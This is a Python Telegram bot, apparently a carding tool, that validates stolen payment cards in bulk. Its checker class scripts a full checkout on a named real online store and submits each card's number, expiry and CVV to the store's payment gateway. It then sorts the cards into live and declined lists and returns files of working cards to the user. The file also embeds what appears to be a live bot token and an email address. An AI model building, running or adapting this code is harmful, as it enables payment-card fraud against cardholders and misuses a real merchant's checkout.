import asyncio
import logging
import re
import requests
import io
import time
from datetime import datetime

from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.error import BadRequest

# --- Configuration ---
# PASTE YOUR BOT TOKEN HERE
BOT_TOKEN = '7678348871:AAFKNVn1IAp46iBcTTOwo31i4WlT2KcZWGE'

# --- Basic Logging Setup ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# -----------------------------------------------------------------------------
#  YOUR ORIGINAL CARD CHECKER LOGIC (WRAPPED IN A CLASS)
#  No major changes were needed here. It works as is.
# -----------------------------------------------------------------------------
class IsolaCardChecker:
    def __init__(self):
        self.gateway_name = "Isola"
        self.timeout = 30
        self.session = requests.Session()
        self.session.headers.update({
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36'
        })
        self.session.verify = True

    def _extract_between(self, text, start, end):
        try:
            start_pos = text.find(start) + len(start)
            end_pos = text.find(end, start_pos)
            return "" if start_pos == -1 or end_pos == -1 else text[start_pos:end_pos]
        except Exception:
            return ""

    def _extract_session_id(self, html):
        patterns = [
            r'name="sessionid"[^>]*value="([^"]+)"',
            r'[?&]sid=([A-Za-z0-9]+)',
            r'sessionid=([A-Za-z0-9]+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return ''

    def _get_bin_info(self, card_number):
        bin_num = card_number[:6]
        try:
            response = requests.get(
                f"https://data.handyapi.com/bin/{bin_num}",
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=5
            )
            if response.status_code == 200 and response.json():
                data = response.json()
                country = data.get('Country', {})
                return {
                    'scheme': data.get('Scheme', 'N/A'),
                    'type': data.get('Type', 'N/A'),
                    'country': country.get('Name', 'N/A'),
                    'flag': country.get('emoji', '')
                }
        except Exception:
            pass
        return {'scheme': 'N/A', 'type': 'N/A', 'country': 'N/A', 'flag': ''}

    def check_card(self, card, month, year, cvv):
        bin_info = self._get_bin_info(card)
        try:
            # Step 0: Warm up session
            self.session.get('https://www.trmsites.com/landstar/proddetail.asp?siteid=90017&prod=LSC%2D132', headers={'Referer': 'https://www.trmsites.com/landstar/'}, timeout=self.timeout)

            # Step 1: Add item to cart
            url = 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid='
            postdata = 'optnSizeColor=&optnCustEmb=&optnUplExt=&quant=1&id=LSC-566&mode=add&x=53&y=12&pCpnItem=0'
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://www.trmsites.com',
                'Referer': 'https://www.trmsites.com/landstar/proddetail.asp?siteid=90017&prod=LSC%2D132',
            }
            response1 = self.session.post(url, data=postdata, headers=headers, timeout=self.timeout)
            redig = self._extract_between(response1.text, '<td width="100%"><form method="POST" action="', '"')
            sessionid = self._extract_session_id(response1.text) or self._extract_session_id(self.session.get(url, timeout=self.timeout).text)
            redig = redig or 'https://www.trmsites.com/landstar/cart.asp?siteid=90017&sid='

            # Simplified data for subsequent requests
            base_data = {
                'sessionid': sessionid, 'email': 'm3hgcool@gmail.com', 'company': 'Test Company', 'phone': '(555) 123-4567',
                'name': 'John', 'name2': 'Doe', 'address': '123 Main Street', 'city': 'New York', 'state': 'New York',
                'country': 'United States of America', 'zip': '10001', 'sResidence': 'OFF', 'sCompany': 'Test Company',
                'sPhone': '5551234567', 'sname': 'John', 'sname2': 'Doe', 'saddress': '123 Main Street',
                'scity': 'New York', 'sstate': 'New York', 'scountry': 'United States of America', 'szip': '10001'
            }

            # Step 2-5: Chained checkout process
            self.session.post(redig, data={'mode': 'logon', 'chkouttype': '', 'agree1': '1', 'sessionid': sessionid}, headers=headers, timeout=self.timeout)
            self.session.post(url, data={'mode': 'precheckout', **base_data}, headers=headers, timeout=self.timeout)
            self.session.post(url, data={'mode': 'go', 'shipping': '7.8|0|FEGD1', **base_data}, headers=headers, timeout=self.timeout)
            response5 = self.session.post(url, data={'toPayMode': '1', 'mode': 'go', 'payprovider': '7', 'shipping': '7.8|0|FEGD1', **base_data}, headers=headers, timeout=self.timeout)

            ordernumber = self._extract_between(response5.text, 'NAME="ordernumber" VALUE="', '"')
            if not ordernumber:
                return {"status": "DECLINED", "message": "Order creation failed", "bin_data": bin_info}

            # Step 6: Payment authorization
            auth_data = {'mode': 'authorize', 'method': 'payflowpro', 'ordernumber': ordernumber, 'ACCT': card, 'EXMON': month, 'EXYEAR': year, 'CVV2': cvv, 'cardZip': '10001', 'sessionid': sessionid}
            response6 = self.session.post(url, data=auth_data, headers=headers, timeout=self.timeout)

            # Analyze final response
            response_text = response6.text
            message = self._extract_between(response_text, '<b><SPAN STYLE="COLOR:#FF0000;">', '</SPAN>')

            if "CVV2 Mismatch" in response_text or "incorrect_cvc" in response_text:
                return {"status": "APPROVED_CCN", "message": "CVV2 Mismatch", "bin_data": bin_info}
            elif "Order Confirmation" in response_text or "Approved" in response_text:
                return {"status": "APPROVED_CVV", "message": "Charge $10 ✅", "bin_data": bin_info}
            else:
                return {"status": "DECLINED", "message": message or "Unknown Decline", "bin_data": bin_info}

        except requests.exceptions.RequestException as e:
            return {"status": "ERROR", "message": f"Network Error: {e}", "bin_data": bin_info}
        except Exception as e:
            logger.error(f"An unexpected error occurred: {e}")
            return {"status": "ERROR", "message": "An internal error occurred.", "bin_data": bin_info}
        finally:
            self.session.close()

# -----------------------------------------------------------------------------
#  BOT HELPER FUNCTIONS
# -----------------------------------------------------------------------------
def parse_and_validate_card_line(line):
    """Parses a line and validates the card format. Returns (card_details, error_message)."""
    line = line.strip()
    # Flexible separators: |, :, /, ;
    parts = re.split(r'[|:;/]', line)

    if len(parts) < 4:
        return None, f'Invalid format: `{line}`. Use `CC|MM|YY|CVV`.'

    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

    if not re.match(r'^\d{13,19}$', card):
        return None, f"Invalid card number: `{card}`"
    if not re.match(r'^\d{1,2}$', month) or not (1 <= int(month) <= 12):
        return None, f"Invalid month: `{month}`"
    if len(year) == 2:
        year = "20" + year
    current_year = datetime.now().year
    if not re.match(r'^\d{4}$', year) or int(year) < current_year:
        return None, f"Invalid year: `{year}`"
    if not re.match(r'^\d{3,4}$', cvv):
        return None, f"Invalid CVV: `{cvv}`"

    return (card, month, year, cvv), None

def escape_markdown_v2(text):
    """Escapes special characters for MarkdownV2."""
    # Characters that need escaping in MarkdownV2
    special_chars = ['\\', '_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def format_response_message(card_line, result):
    """Formats the checker result into a nice string for Telegram."""
    status = result.get('status', 'ERROR')
    message = result.get('message', 'N/A')
    bin_data = result.get('bin_data', {})

    if status == "APPROVED_CVV":
        icon = "✅"
        status_text = "APPROVED"
    elif status == "APPROVED_CCN":
        icon = "CCN ✅"
        status_text = "LIVE (CCN)"
    elif status == "DECLINED":
        icon = "❌"
        status_text = "DECLINED"
    else:
        icon = "⚠️"
        status_text = "ERROR"

    # Escape special characters for MarkdownV2
    card_line_safe = escape_markdown_v2(card_line)
    message_safe = escape_markdown_v2(message)
    scheme_safe = escape_markdown_v2(bin_data.get('scheme', 'N/A'))
    type_safe = escape_markdown_v2(bin_data.get('type', 'N/A'))
    country_safe = escape_markdown_v2(bin_data.get('country', 'N/A'))
    flag_safe = escape_markdown_v2(bin_data.get('flag', ''))

    text = (
        f"{icon} *Status: {status_text}*\n\n"
        f"💳 `__{card_line_safe}__`\n"
        f"💬 *Response:* {message_safe}\n"
        f"🏦 *Gateway:* Payflow \\($10 Charge\\)\n\n"
        f"🌍 *BIN Info:*\n"
        f"  `{scheme_safe} \\- {type_safe}`\n"
        f"  `{country_safe} {flag_safe}`"
    )
    return text

# -----------------------------------------------------------------------------
#  BOT COMMAND HANDLERS
# -----------------------------------------------------------------------------
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /start command."""
    user = update.effective_user
    welcome_message = (
        f"Hello, {user.first_name}! 👋\n\n"
        "I am your credit card checking assistant.\n\n"
        "Here's how to use me:\n\n"
        "1️⃣ *Single Check:*\n"
        "   `/chk CC|MM|YY|CVV`\n"
        "   Example: `/chk 1234567890123456|12|28|123`\n\n"
        "2️⃣ *Mass Check:*\n"
        "   Send `/mchk` and then upload a `.txt` file with one card per line in the same format."
    )
    await update.message.reply_text(welcome_message, parse_mode=ParseMode.MARKDOWN)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /chk command (single check)."""
    if not context.args:
        await update.message.reply_text("Please provide card details. Usage: `/chk CC|MM|YY|CVV`")
        return

    card_line = context.args[0]
    card_details, error = parse_and_validate_card_line(card_line)

    if error:
        await update.message.reply_text(error, parse_mode=ParseMode.MARKDOWN)
        return

    card, month, year, cvv = card_details

    # Send a "checking" message first
    processing_msg = await update.message.reply_text("⏳ Checking your card, please wait...")

    # Run the blocking network code in a separate thread
    checker = IsolaCardChecker()
    result = await asyncio.to_thread(checker.check_card, card, month, year, cvv)

    # Format and send the final result by editing the original message
    response_text = format_response_message(card_line, result)
    await processing_msg.edit_text(response_text, parse_mode=ParseMode.MARKDOWN_V2)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for the /mchk command (mass check)."""
    await update.message.reply_text("Please upload your `.txt` file now. Each line should be `CC|MM|YY|CVV`.")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the file upload for mass checking."""
    document = update.message.document
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("Invalid file type. Please upload a `.txt` file.")
        return

    try:
        file = await document.get_file()
        file_content_bytes = await file.download_as_bytearray()
        file_content = file_content_bytes.decode('utf-8')
        lines = [line for line in file_content.splitlines() if line.strip()]

        if not lines:
            await update.message.reply_text("The file is empty.")
            return

        total_cards = len(lines)
        approved_cvv_list = []
        approved_ccn_list = []
        declined_list = []
        checked_count = 0

        start_time = time.time()
        status_msg = await update.message.reply_text(f"Starting mass check for {total_cards} cards...")

        last_update_time = 0

        for line in lines:
            checked_count += 1
            card_details, error = parse_and_validate_card_line(line)

            if error:
                declined_list.append(f"{line} - {error}")
                continue

            card, month, year, cvv = card_details

            # Run checker in a separate thread to not block the bot
            checker = IsolaCardChecker()
            result = await asyncio.to_thread(checker.check_card, card, month, year, cvv)

            if result['status'] == 'APPROVED_CVV':
                approved_cvv_list.append(f"{line} - {result['message']}")
            elif result['status'] == 'APPROVED_CCN':
                approved_ccn_list.append(f"{line} - {result['message']}")
            else:
                declined_list.append(f"{line} - {result['message']}")

            # Update status message every 2 seconds or for every 5 cards to avoid rate limits
            current_time = time.time()
            if current_time - last_update_time > 2 or checked_count % 5 == 0 or checked_count == total_cards:
                elapsed_time = current_time - start_time
                progress = checked_count / total_cards

                # Progress bar
                bar_length = 10
                filled_length = int(bar_length * progress)
                bar = '█' * filled_length + '░' * (bar_length - filled_length)

                stats_text = (
                    f"*Mass Check in Progress...*\n\n"
                    f"`{bar}` {progress:.0%}\n\n"
                    f"✅ *Approved (CVV):* {len(approved_cvv_list)}\n"
                    f"✅ *Approved (CCN):* {len(approved_ccn_list)}\n"
                    f"❌ *Declined/Error:* {len(declined_list)}\n"
                    f"🔢 *Checked:* {checked_count}/{total_cards}\n"
                    f"⏱️ *Time Elapsed:* {elapsed_time:.2f}s"
                )
                try:
                    await status_msg.edit_text(stats_text, parse_mode=ParseMode.MARKDOWN)
                    last_update_time = current_time
                except BadRequest as e:
                    if "Message is not modified" not in str(e):
                        logger.warning(f"Error updating status message: {e}")
                await asyncio.sleep(0.1) # small sleep to yield control

        # --- Final Summary ---
        total_time = time.time() - start_time
        final_summary = (
            f"*Mass Check Complete!*\n\n"
            f"✅ *Approved (CVV):* {len(approved_cvv_list)}\n"
            f"✅ *Approved (CCN):* {len(approved_ccn_list)}\n"
            f"❌ *Declined/Error:* {len(declined_list)}\n"
            f"🔢 *Total Checked:* {checked_count}/{total_cards}\n"
            f"⏱️ *Total Time:* {total_time:.2f}s"
        )
        await status_msg.edit_text(final_summary, parse_mode=ParseMode.MARKDOWN)

        # Send results as files if they contain any entries
        if approved_cvv_list:
            cvv_file_content = "\n".join(approved_cvv_list)
            cvv_file = io.BytesIO(cvv_file_content.encode('utf-8'))
            await update.message.reply_document(InputFile(cvv_file, filename="approved_cvv.txt"))

        if approved_ccn_list:
            ccn_file_content = "\n".join(approved_ccn_list)
            ccn_file = io.BytesIO(ccn_file_content.encode('utf-8'))
            await update.message.reply_document(InputFile(ccn_file, filename="approved_ccn.txt"))

    except Exception as e:
        logger.error(f"Error handling file: {e}")
        await update.message.reply_text(f"An error occurred while processing the file: {e}")


# -----------------------------------------------------------------------------
#  MAIN BOT SETUP AND EXECUTION
# -----------------------------------------------------------------------------
def main():
    """Start the bot."""
    if BOT_TOKEN == 'YOUR_TELEGRAM_BOT_TOKEN':
        print("!!! ERROR: Please replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token. !!!")
        return

    application = Application.builder().token(BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))

    # Add a message handler for text files
    application.add_handler(MessageHandler(filters.Document.TEXT, handle_file))

    # Start the Bot
    print("Bot is running...")
    application.run_polling()


if __name__ == '__main__':
    main()
